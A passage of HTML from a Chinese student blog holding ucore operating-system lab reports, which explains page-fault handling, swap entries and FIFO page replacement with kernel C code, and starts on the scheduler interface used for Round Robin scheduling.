<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct vma_struct *vma &#x3D; find_vma(mm, addr);</span><br><span class="line">if (vma &#x3D;&#x3D; NULL || vma-&gt;vm_start &gt; addr) &#123;</span><br><span class="line">        cprintf(&quot;not valid addr %x, and  can not find it in vma\n&quot;, addr);</span><br><span class="line">        goto failed;</span><br><span class="line">    &#125;</span><br><span class="line">ptep &#x3D; get_pte(mm-&gt;pgdir, addr, 1))</span><br><span class="line">pgdir_alloc_page(mm-&gt;pgdir, addr, perm)</span><br></pre></td></tr></table></figure>
<p>因为 vma 里写的是 1MB 空间，实际只分配给了 16KB ，缺页的时候只要地址在 1MB 的范围内，那么 通过缺页的地址是找得到对应的 vma 的，说明这个是个合法地址，os 会自动根据缺页地址新建页表项并分配 page 。当栈的使用超过 1MB，就会找不到 vma 直接报错，这个行为目前会直接崩掉内核，可用考虑后续的优化。</p>
<h3 id="时钟中断"><a href="#时钟中断" class="headerlink" title="时钟中断"></a>时钟中断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;设置时钟每秒中断100次</span><br><span class="line">    outb(IO_TIMER1, TIMER_DIV(100) % 256);</span><br><span class="line">    outb(IO_TIMER1, TIMER_DIV(100) &#x2F; 256);</span><br><span class="line">&#x2F;&#x2F; 通过中断控制器使能时钟中断</span><br><span class="line">    pic_enable(IRQ_TIMER);</span><br></pre></td></tr></table></figure>
<p>每 1s 中断 100 次则一个时间片的时长为 10ms ， usleep(100) 睡眠 1s。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/Lab3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/24/Lab3/" class="post-title-link" itemprop="url">Lab3 实验报告</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-01-24T10:47:34Z">2021-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:27:29" itemprop="dateModified" datetime="2021-04-23T00:27:29Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab3"><a href="#Lab3" class="headerlink" title="Lab3"></a>Lab3</h1><h2 id="do-pgfault-之前"><a href="#do-pgfault-之前" class="headerlink" title="do_pgfault 之前"></a>do_pgfault 之前</h2><p>当程序访问内存遇上特殊情况时，CPU 会执行第十四号中断处理程序——缺页处理程序来处理。</p>
<p>特殊情况如下</p>
<ol>
<li>写入一个存在物理页的虚拟页——写时复制。</li>
<li>读写一个不存在物理页的虚拟页——缺页。</li>
<li>不满足访问权限。</li>
</ol>
<p>当程序触发缺页中断时，CPU 会把产生异常的线性地址存储在 CR2 寄存器中，并且把页访问异常错误码保存在中断栈中。</p>
<p>其中，页访问异常错误码的位 0 为 1 表示对应物理页不存在；位 1 为 1 表示写异常；位 2 为 1 表示访问权限异常。</p>
<h3 id="中断处理机制"><a href="#中断处理机制" class="headerlink" title="中断处理机制"></a>中断处理机制</h3><p>一直到<code>do_pgfault</code>的函数调用链为</p>
<p><strong>trap–&gt; trap_dispatch–&gt;pgfault_handler–&gt;do_pgfault</strong></p>
<p>首先是在 trap.c 中中断向量表初始化的时候，将 vectors.S 中的所有跳转到__alltraps 的函数作为中断处理程序填写到 idt 表中，并设置中断寄存器 IDT。</p>
<p>完成该操作后，所有的中断会带着中断的描述向量值跳转到 __alltraps 中，这段汇编会进行中断现场的保存和恢复，并建立一个中断栈帧，最后带着栈帧跳转到 trap.c 中的 trap 函数，trap 函数直接调用 trap_dispatch（并传递该栈帧），trap_dispatch 函数包含了一个 case 语句，根据中断号调用 os 中不同的函数进行处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vector254:</span><br><span class="line">  pushl $<span class="number">0</span></span><br><span class="line">  pushl $<span class="number">254</span></span><br><span class="line">  jmp __alltraps</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">gatedesc</span> <span class="title">idt</span>[256] =</span> &#123;&#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> <span class="title">idt_pd</span> =</span> &#123;</span><br><span class="line">    <span class="keyword">sizeof</span>(idt) - <span class="number">1</span>, (<span class="keyword">uintptr_t</span>)idt</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">idt_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(idt) / <span class="keyword">sizeof</span>(struct gatedesc); i ++) &#123;</span><br><span class="line">        SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line">    lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="do-pgfault"><a href="#do-pgfault" class="headerlink" title="do_pgfault"></a>do_pgfault</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_pgfault</span><span class="params">(struct mm_struct *mm, <span class="keyword">uint32_t</span> error_code, <span class="keyword">uintptr_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL;</span><br><span class="line">    <span class="comment">// 获取触发pgfault的虚拟地址所在虚拟页</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> =</span> find_vma(mm, addr);</span><br><span class="line"></span><br><span class="line">    pgfault_num++;</span><br><span class="line">    <span class="comment">// 如果当前访问的虚拟地址不在已经分配的虚拟页中</span></span><br><span class="line">    <span class="keyword">if</span> (vma == <span class="literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检测错误代码。这里的检测不涉及特权判断。</span></span><br><span class="line">    <span class="keyword">switch</span> (error_code &amp; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 写，同时存在物理页，则写时复制</span></span><br><span class="line">        <span class="comment">// 需要注意的是，default会执行case2的代码，也就是判断是否有写权限。</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="comment">// 读，同时不存在物理页</span></span><br><span class="line">        <span class="comment">// 同时如果当前操作是写入，但所在虚拟页不允许写入</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&#x27;s vma cannot write\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">/* error code flag : (W/R=0, P=1): read, present */</span></span><br><span class="line">        <span class="comment">// 读，同时存在物理页。那就不可能会调用page fault，肯定哪里有问题，直接failed</span></span><br><span class="line">        cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* error code flag : (W/R=0, P=0): read, not present */</span></span><br><span class="line">        <span class="comment">// 写，同时不存在物理页面</span></span><br><span class="line">        <span class="comment">// 如果当前操作是读取，但所在虚拟页不允许读取或执行</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&#x27;s vma cannot read or exec\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置页表条目所对应的权限</span></span><br><span class="line">    <span class="keyword">uint32_t</span> perm = PTE_U;</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;</span><br><span class="line">        perm |= PTE_W;</span><br><span class="line">    &#125;</span><br><span class="line">    addr = ROUNDDOWN(addr, PGSIZE);</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">pte_t</span> *ptep=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* LAB3 EXERCISE 1: YOUR CODE */</span></span><br><span class="line">    <span class="comment">// 查找当前虚拟地址所对应的页表项</span></span><br><span class="line">    <span class="comment">// create 是 1，查找对应的页表项，页目录下找不到该页表则新建一个页表</span></span><br><span class="line">    <span class="comment">// 返回该页表的地址，地址为空说明找不到页表地址，直接返回failed</span></span><br><span class="line">    <span class="keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;get_pte in do_pgfault failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果这个页表项（用了*说明取了页表项中的内容）为0（啥没有）说明所对应的物理页不存在，则新建一个页对应页表</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 分配一块物理页，并设置页表项</span></span><br><span class="line">        <span class="keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* LAB3 EXERCISE 2: YOUR CODE */</span></span><br><span class="line">        <span class="comment">// 如果这个页表项所对应的物理页存在，但不在内存中</span></span><br><span class="line">        <span class="comment">// 如果swap已经初始化完成</span></span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) &#123;</span><br><span class="line">            struct Page *page=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// 将目标数据加载到某块新的物理页中。</span></span><br><span class="line">            <span class="comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span></span><br><span class="line">            <span class="keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="number">0</span>) &#123;</span><br><span class="line">                cprintf(<span class="string">&quot;swap_in in do_pgfault failed\n&quot;</span>);</span><br><span class="line">                <span class="keyword">goto</span> failed;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span></span><br><span class="line">            page_insert(mm-&gt;pgdir, page, addr, perm);</span><br><span class="line">            <span class="comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span></span><br><span class="line">            swap_map_swappable(mm, addr, page, <span class="number">1</span>);</span><br><span class="line">            page-&gt;pra_vaddr = addr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   ret = <span class="number">0</span>;</span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以只要在 vma 里面设置的地址都是被 os 认定为有效的，找不到该地址会新建一个页，该页判断被换出会进行换入操作。</p>
<p>swap_in 函数首先向 OS 申请一个空闲页面，然后调用 swapfs_read 尝试将其从 swap 分区中读出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">swap_in(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page **ptr_result)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">result</span> =</span> alloc_page();</span><br><span class="line">     <span class="keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">0</span>);</span><br><span class="line">     <span class="keyword">int</span> r;</span><br><span class="line">     <span class="comment">//*ptep = pa | PTE_P | perm;</span></span><br><span class="line">     <span class="comment">//这时候PTE_P无效，pa与磁盘扇区有映射关系</span></span><br><span class="line">     <span class="keyword">if</span> ((r = swapfs_read((*ptep), result)) != <span class="number">0</span>)</span><br><span class="line">        assert(r!=<span class="number">0</span>);</span><br><span class="line">     *ptr_result=result;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SWAP"><a href="#SWAP" class="headerlink" title="SWAP"></a>SWAP</h2><p>虚存中的页与硬盘上的扇区之间的映射关系</p>
<p>如果一个页被置换到了硬盘上，那操作系统如何能简捷来表示这种情况呢？在 ucore 的设计上，充分利用了页表中的 PTE 来表示这种情况：当一个 PTE 用来描述一般意义上的物理页时，显然它应该维护各种权限和映射关系，以及应该有 PTE_P 标记；但当它用来描述一个被置换出去的物理页时，它被用来维护该物理页与 swap 磁盘上扇区的映射关系，并且该 PTE 不应该由 MMU 将它解释成物理页映射(即没有 PTE_P 标记)，与此同时对应的权限则交由 mm_struct 来维护，当对位于该页的内存地址进行访问的时候，必然导致 page fault，然后 ucore 能够根据 PTE 描述的 swap 项将相应的物理页重新建立起来，并根据虚存所描述的权限重新设置好 PTE 使得内存访问能够继续正常进行。</p>
<p>如果一个页（4KB/页）被置换到了硬盘某 8 个扇区（0.5KB/扇区），该 PTE 的最低位–present 位应该为 0 （即 PTE_P 标记为空，表示虚实地址映射关系不存在），接下来的 7 位暂时保留，可以用作各种扩展；而包括原来高 20 位页帧号的高 24 位数据，恰好可以用来表示此页在硬盘上的起始扇区的位置（其从第几个扇区开始）。为了在页表项中区别 0 和 swap 分区的映射，将 swap 分区的一个 page 空出来不用，也就是说一个高 24 位不为 0，而最低位为 0 的 PTE 表示了一个放在硬盘上的页的起始扇区号（见 swap.h 中对 swap_entry_t 的描述）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">swap_entry_t</span><br><span class="line">-------------------------</span><br><span class="line">| offset | reserved | 0 |</span><br><span class="line">-------------------------</span><br><span class="line">24 bits    7 bits   1 bit</span><br></pre></td></tr></table></figure>
<p>考虑到硬盘的最小访问单位是一个扇区，而一个扇区的大小为 512（$2^8$）字节，所以需要 8 个连续扇区才能放置一个 4KB 的页。在 ucore 中，用了第二个 IDE 硬盘来保存被换出的扇区，根据实验三的输出信息</p>
<blockquote>
<p>实验三还创建了一个 swap.img</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SWAPIMG		:= <span class="variable">$(<span class="built_in">call</span> totarget,swap.img)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(SWAPIMG)</span>:</span><br><span class="line">	<span class="variable">$(V)</span>dd if=/dev/zero of=<span class="variable">$@</span> bs=1024k count=128</span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target,swap.img)</span></span><br></pre></td></tr></table></figure>
<p>“ide 1: 262144(sectors), ‘QEMU HARDDISK’.”</p>
<p>我们可以知道实验三可以保存 262144/8=32768 个页，即 128MB 的内存空间。swap 分区的大小是 swapfs_init 里面根据磁盘驱动的接口计算出来的，目前 ucore 里面要求 swap 磁盘至少包含 1000 个 page，并且至多能使用 1&lt;&lt;24 个 page。</p>
<h2 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h2><p>Page 的数据结构里面又多了几个链接域，用于下面换入换出的时候来管理这些个 Page。因为 FIFO 需要维护现在正在使用的页，所以用来管理的结构是 Page 。因为这些页都是真的，没有被换出，被换出就得删页改页表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// the control struct for a set of vma using the same PDT</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list;        <span class="comment">// 按照虚拟地址顺序双向连接的虚拟页链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span> <span class="comment">// 当前使用的虚拟页地址，该成员加速页索引速度。</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir;                  <span class="comment">// 虚拟页对应的PDT</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                 <span class="comment">// 虚拟页个数</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv;                 <span class="comment">// 用于指向swap manager的某个链表,在FIFO算法中，该双向链表用于将可交换的已分配物理页串起来</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> ref;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;</span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;</span><br><span class="line">    <span class="keyword">list_entry_t</span> pra_page_link;     <span class="comment">// 用于连接上一个和下一个*可交换已分配*的物理页</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> pra_vaddr;            <span class="comment">// 用于保存该物理页所对应的虚拟地址。</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page   *page, <span class="keyword">int</span> swap_in)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);</span><br><span class="line"></span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//record the page access situlation</span></span><br><span class="line">    <span class="comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span></span><br><span class="line">    <span class="comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span></span><br><span class="line">    list_add(head, entry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">         assert(head != <span class="literal">NULL</span>);</span><br><span class="line">     assert(in_tick==<span class="number">0</span>);</span><br><span class="line">     <span class="comment">/* Select the victim */</span></span><br><span class="line">     <span class="comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span></span><br><span class="line">     <span class="comment">//(1)  unlink the  earliest arrival page in front of pra_list_head qeueue</span></span><br><span class="line">     <span class="comment">//(2)  assign the value of *ptr_page to the addr of this page</span></span><br><span class="line">     <span class="keyword">list_entry_t</span> *le = head-&gt;prev;</span><br><span class="line">     assert(head!=le);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> le2page(le, pra_page_link);</span><br><span class="line">     list_del(le);</span><br><span class="line">     assert(p !=<span class="literal">NULL</span>);</span><br><span class="line">     *ptr_page = p;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/Lab6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/24/Lab6/" class="post-title-link" itemprop="url">Lab6 实验报告</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-01-24T10:47:34Z">2021-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:28:47" itemprop="dateModified" datetime="2021-04-23T00:28:47Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Lab6"><a href="#Lab6" class="headerlink" title="Lab6"></a>Lab6</h1><h2 id="Round-Robin-调度算法"><a href="#Round-Robin-调度算法" class="headerlink" title="Round Robin 调度算法"></a>Round Robin 调度算法</h2><p>请理解并分析 sched_class 中各个函数指针的用法，并结合 Round Robin 调度算法描 ucore 的调度执行过程</p>
<h3 id="sched-class-中各个函数指针的用法"><a href="#sched-class-中各个函数指针的用法" class="headerlink" title="sched_class 中各个函数指针的用法"></a>sched_class 中各个函数指针的用法</h3><p>sched_class 的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The introduction of scheduling classes is borrrowed from Linux, and makes the</span></span><br><span class="line"><span class="comment">// core scheduler quite extensible. These classes (the scheduler modules) encapsulate</span></span><br><span class="line"><span class="comment">// the scheduling policies.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> &#123;</span></span><br><span class="line">    <span class="comment">// the name of sched_class</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="comment">// Init the run queue</span></span><br><span class="line">    <span class="keyword">void</span> (*init)(struct run_queue *rq);</span><br><span class="line">    <span class="comment">// put the proc into runqueue, and this function must be called with rq_lock</span></span><br><span class="line">    <span 